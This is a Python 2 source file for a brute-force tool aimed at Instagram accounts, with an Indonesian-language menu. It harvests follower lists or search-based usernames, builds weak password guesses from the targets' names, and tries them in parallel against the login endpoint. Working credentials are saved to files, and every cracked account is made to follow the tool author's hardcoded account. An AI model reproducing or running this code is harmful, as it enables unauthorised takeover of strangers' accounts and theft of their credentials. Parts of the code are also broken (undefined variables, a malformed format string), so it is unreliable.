#!/usr/bin/python2
# coding=utf-8
# Author: fall.xavier
# Tool Instaram
# Versi 0.1

### IMPORT MODULE ###
import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time,calendar
from calendar import monthrange
from datetime import date
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
	import concurrent.futures
except ImportError:
	print("\n Modul Futures blom terinstall!...")
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print("\n Modul Requests blom terinstall!...")
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

### GLOBAL NAME ###
IP = requests.get('https://api.ipify.org').text
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))

data_= []
hasil_ok = []
hasil_cp = []
c=1

status_foll =[]
data_followers = []
pencarian_ = []
hastag = []

try:
	has_ok = open("ok.txt", "r").readlines()
	with open("ok.txt", "w") as tul:
		tul.write("")
	for dev in set(has_ok):
		with open("ok.txt", "a") as tu:
			tu.write(dev)
except:
	pass
try:
	has_cp = open("cp.txt", "r").readlines()
	with open("cp.txt", "w") as tul:
		tul.write("")
	for dev in set(has_cp):
		with open("cp.txt", "a") as tu:
			tu.write(dev)
except:
	pass
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

### HAPUS COOKIE ###
def hapus_cookie():
	try:
		os.system("del cookie.txt" if os.name == "nt" else "rm -f cookie.txt")
	except:
		pass
def hapus_cokiz():
	try:
		os.system("del cokiz.txt" if os.name == "nt" else "rm -f cokiz.txt")
	except:
		pass

### CEK LOGIN ###
def cek_login():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login_dev()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/2220243163/followers/?count=5"
		with requests.Session() as ses_dev:
			try:
				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print"\n %s[!] akun terkena checkpoint!"%(M)
					hapus_cookie()
					login_dev()	
			except ValueError:
				print"\n %s[!] akun terkena checkpoint!"%(M)
				hapus_cookie()
				login_dev()
None
### LOGINAN ###
def login_dev():
	global cookie
	os.system("clear")
	logo()
	print "  [ login akun instagram untuk lanjut ]"
	username_dev = raw_input("\n [?] username instagram : ")
	pass_dev = raw_input(" [?] password instagram : ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()

			if "userId" in str(data_dev):
				print"\n %s[✓] berhasil login ke akun"%(H)
				for dev in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}

			elif "checkpoint_url" in str(data_dev):
				print"\n %s[!] akun terkena checkpoint!"%(M)

			elif "Please wait" in str(data_dev):
				print" %s[!] aktifkan mode pesawat 5 detik!"%(M)

			else:
				print m+"\n Gagal Login...."
				exit()
				
	except KeyboardInterrupt:
		exit()

### LOGO ###
def logo():
	os.system("clear")
	print("""%s
\x1b[1;91m ___________          _____ _____________________ \x1b[1;96m|•| Recode By   : NdriiTzy X SlankTzy
\x1b[1;92m \_   _____/         /     \\______   \_   _____/  \x1b[1;95m|•| Github      : github.com/YumasaaTzy
\x1b[1;93m  |    __)  ______  /  \ /  \|    |  _/|    __)   \x1b[1;94m|•| Facebook    : Ndrii Tzy
\x1b[1;94m  |     \  /_____/ /    Y    \    |   \|     \    \x1b[1;93m|•| Name Script : Fuck Multi Brute Force
\x1b[1;95m  \___  /          \____|__  /______  /\___  /    \x1b[1;92m|•| Perecode Hamdal Team 
\x1b[1;96m      \/                   \/       \/     \/     \x1b[1;91m|•| The Javu Avokados      """%(N))

### MENU ###
def menu_dev():
	logo()
	print(" [*] Email       : crottttt@gmail.com")
	print(" [*] Bergabung   : %s"%(tgl))
	print(" [*] ---------------------------------------------")
	print(" [*] Status      : %sPremium Sampai Lu Mokad%s"% (H,N))
	print(" [*] Kadaluwarsa : 24 April 2025")
	print(" [*] ---------------------------------------------")
	print(" [*] IP          : %s\n"%(IP))
	print(" [ selamat datang %suser premium%s ]\n"%(K,N))
	print(" [01]. crack dari akun publik")
	print(" [02]. crack dari pencarian")
	print(" [03]. crack ulang hasil cp")
	print(" [04]. cek akun hasil crack")
        print(" [05]. Auto followers target")
        print(" [06]. Laporkan bug script")
	print(" [%s00%s]. logout (hapus login)"%(M,N))
	pil = raw_input("\n [?] pilih menu : ")
	limit = ("100000")
	if pil == "1" or pil == "01":
		pas = ""
		status = ""
		username = raw_input(" [?] masukan username target : ")
		info_dev(username, pas, status)

		print("\n [ pilih target crack satu² ]")
		print("\n [1]. pengikutt %s : %s%s%s"%(username,H,str(pengikut),N))
		print(" [2]. mengikuti %s : %s%s%s"%(username,H,str(mengikuti),N))
		pil2=raw_input("\n [?] pilih : ")
		if pil2 == "1":
			data_follower_dev(cookie, id_, limit, pil2)
			print("\n [*] hasil OK tersimpan di : ok.txt")
			print(" [*] hasil CP tersimpan di : cp.txt \n")
			crack()
		elif pil2 == "2":
			data_follower_dev(cookie, id_, limit, pil2)
			print("\n [*] hasil OK tersimpan di : ok.txt")
			print(" [*] hasil CP tersimpan di : cp.txt \n")
			crack()
		else:
			pass
	elif pil == "2" or pil == "02":
		usr_ = raw_input(" [?] masukan nama pencarian (cth : yoga): ")
		jm = input(" [?] masukan jumlah : ")
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		print("\n [*] hasil OK tersimpan di : ok.txt")
		print(" [*] hasil CP tersimpan di : cp.txt \n")
		crack()
	elif pil == "3" or pil == "03":
		dirs = os.listdir("Chek")
		print(" [*] list nama file tersimpan di folder Chek\n")
		for file in dirs:
			print(" [+] "+file)
		try:
			file = raw_input("\n [?] pilih nama file : ")
			if file == "":
				menu_dev()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		try:
			data_cp = open("Chek/%s","r"%(file)).readlines()
			for dev in data_cp:
				data_.append(dev)
		except Exception as e:
			exit("%s"%(e))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for data_cek in data_cp:
				try:
					pw = []
					user_cp = data_cek.split("|")[0].replace(" [Check] ","")
					pw_cp = data_cek.split("|")[1]
					pw.append(pw_cp)
					fall.submit(crack_dev, user_cp, pw)
				except:pass
	elif pil == "4" or pil == "04":
		print("\n [1] lihat hasil Live")
		print(" [2] lihat hasil Chek")
		cek = raw_input("\n [?] choose : ")
		if cek =="":
			menu_dev()
		elif cek == "1":
			dirs = os.listdir("Live")
			print(" [*] list nama file tersimpan di folder Live\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu_dev()
				totalok = open("Live/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] tanggal : %s total : %s"%(del_txt, len(totalok)))
			print("%s"%(H))
			os.system("cat Live/%s"%(file))
			raw_input("\n %s[*] tekan enter untuk kembali ke menu "%(N))
			menu_dev()
		elif cek == "2":
			dirs = os.listdir("Chek")
			print(" [*] list nama file tersimpan di folder Chek\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu_dev()
				totalcp = open("Chek/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] tanggal : %s total : %s"%(del_txt, len(totalcp)))
			print("%s"%(K))
			os.system("cat Chek/%s"%(file))
			raw_input("\n %s[*] tekan enter untuk kembali ke menu "%(N))
			menu_dev()
		else:
			menu_dev()
	elif pil == "0" or pil == "00":
		kel = raw_input(" [?] yakin mau keluar dari akun Instagram?[Y/t] : ")
		if kel in ["y", "Y"]:
			hapus_cookie()
			print " [✓] berhasil keluar..."
		else:
			print" [*] silahkan jalan ulang toolsnya"
	else:
		print" [!] isi pilhan dengan benar!"

### DUMP PUBLIK ###
def data_follower_dev(cookie, id_target, limit, opsi):
	global c
	if opsi == "1":
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif opsi == "2":
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		exit(" Error..")
	with requests.Session() as ses_dev:
		res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
		for dev in json.loads(res_dat_foll.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				#print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
				#sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)
None

### DUMP PENCARIAN ###
def data_pencarian_dev(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			users = dev["user"]
			print " Username:",users["username"]
			print " Nama:",users["full_name"].encode("utf-8")
			print "-"*50
			
### DUMP QUERY ###
def hastag(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/tags/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				#print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
				#sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)

### PW LIST ###
def crack():
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()

				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(pw_nam[0]+"123")
					pw.append(dat_)

				insta_dev.submit(crack_dev, dat_, pw)
			except:
				pass

None

### CRACK ###
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	
	for pass_satu in pass_dev_:
		if c != 1:
			pass
		else:
			if len(status_foll) != 1:
				print("\r {}[*] [crack] {}/{} OK-:{} - CP-:{}".format(N,str(count_),len(data_),len(hasil_ok), len(hasil_cp))),
				sys.stdout.flush()
				c_pw -= 1
			else:
				pass
		
		try:
			if username_dev in hasil_ok or username_dev in hasil_cp:
				break
			pass_dev = pass_satu.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as dev:
					url_scrap = "https://www.instagram.com/"
					data = dev.get(url_scrap, headers=headerz).content
					crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
				param = {"username": username_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pass_dev),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			except:
				header = {}
				param = {}
				pass
			
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url, data=param, headers=header)
				data_dev = json.loads(respon.content)
				time.sleep(00.1)
				if "checkpoint_url" in str(data_dev):
					cp = "Checkpoint"
					info_dev(username_dev, pass_dev, cp)
					open("Chek/%s.txt"%(tanggal),"a").write(" [Chek] %s|%s\n"%(username_dev, pass_dev))
					hasil_cp.append(username_dev)
					break
				elif "userId" in str(data_dev):
					live = "Live"
					if len(status_foll) != 1:
						info_dev(username_dev, pass_dev, live)
						open("Live/%s.txt"%(tanggal),"a").write(" [Live] %s|%s\n"%(username_dev, pass_dev))
						hasil_ok.append(username_dev)
						follow_dev(ses_dev,username_dev)
					else:
						hasil_ok.append("dev_id")
						follow_dev(ses_dev,username_dev)
					break
				elif "Please wait" in str(data_dev):
					print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
					c+=1
					sys.stdout.flush()
					pass_dev_iq = [pass_dev]
					crack_dev(username_dev, pass_dev_iq)
					count_ -= 1
				else:
					c = 1
					pass
		except requests.exceptions.ConnectionError:
			print("\r %s[!] anda tidak terhubung ke internet"%(M)),
			sys.stdout.flush()
			c+=1
			pass_dev_iq = [pass_dev]
			crack_dev(username_dev, pass_dev_iq)
			count_ -= 1
		except:
			c = 1
			pass

	count_+=1
None

c_foll = 1
count_foll = 1
def follow_dev(ses_dev, username_dev):
	global c_foll, count_foll
	if len(status_foll) != 1:
		user_target = "fall.xavier"
		id_target = "2220243163"
	else:
		print("\r {}[*] [follow] {}/{} OK-:{} - CP-:{}".format(N,str(count_foll),len(data_),len(hasil_ok), len(hasil_cp))),
		sys.stdout.flush()
		user_target = username_get_follow
		id_target = id_

	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
	if len(status_foll) != 1:
		pass
	else:
		print(" [✓] berhasil mengikuti")

def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		if status == "Live":
			print"\r "+N+"[✓] Status   : "+H+status + "                 "
			print"\r "+N+"[✓] Nama     : "+H+ str(nama) + "              "
			print"\r "+N+"[✓] pengikut : "+H+ str(pengikut) + "              "
			print"\r "+N+"[✓] mengikuti: "+H+ str(mengikuti) + "              "
			print"\r "+N+"[✓] Username : "+H+ username_dev + "              "
			print"\r "+N+"[✓] Password : "+H+ pass_dev + "             \n"
		elif status == "Checkpoint":
			print"\r "+N+"[✓] Status   : "+K+status + "                 "
			print"\r "+N+"[✓] Nama     : "+K+ str(nama) + "              "
			print"\r "+N+"[✓] pengikut : "+K+ str(pengikut) + "              "
			print"\r "+N+"[✓] mengikuti: "+K+ str(mengikuti) + "              "
			print"\r "+N+"[✓] Username : "+K+ username_dev + "              "
			print"\r "+N+"[✓] Password : "+K+ pass_dev + "             \n"
		else:
			pass
	except:
		pass
None

def auto_follow(status_):
	if status_ == "iqbal_dev":
		try:
			data_cp = open("cp.txt","r").readlines()
			for dev in data_cp:
				data_.append(dev)
		except:
			exit()
		with ThreadPoolExecutor(max_workers=10) as insta_cek_dev:
			for data_cek in data_cp:
				try:
					pw_cp_ = []
					user_cp = data_cek.split("|")[1].replace(" [Check] ","")
					pw_cp_ = data_cek.split("|")[3]
					pw_cp_.append(pw_cp_+y)
					insta_cek_dev.submit(crack_dev, user_cp, pw_cp_)
				except:
					pass

None

def buatfolder():
	try:os.mkdir("Chek")
	except:pass
	try:os.mkdir("Live")
	except:pass

if __name__=="__main__":
	buatfolder()
	cek_login()
	menu_dev()


